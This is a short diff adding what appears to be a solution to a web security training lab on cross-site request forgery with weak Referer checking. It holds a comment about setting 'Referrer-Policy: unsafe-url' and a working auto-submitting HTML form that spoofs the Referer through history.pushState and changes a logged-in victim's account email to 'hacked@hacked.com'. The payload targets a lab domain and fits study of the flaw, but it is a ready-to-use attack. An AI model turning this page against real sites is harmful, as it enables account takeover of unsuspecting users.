@@ -1,0 +1,16 @@
+# Here's an example where, if we change in the referrer to https://WHATEVER-page.net, it works, but if we don't include a referrer, we get an error. So, in the header, we add:
+
+Referrer-Policy: unsafe-url
+
+#Ya en el body:
+<html>
+  <body>
+  <script>history.pushState("", "", "/?0a390038042d35398333e71a00440004.web-security-academy.net")</script>
+    <form action="https://0a390038042d35398333e71a00440004.web-security-academy.net/my-account/change-email" method="POST">
+      
+      <input type="hidden" name="email" value="hacked@hacked.com">
+      <input type="submit" value="Submit request" />
+    </form>
+<script>document.forms[0].submit();</script>
+  </body>
+</html>
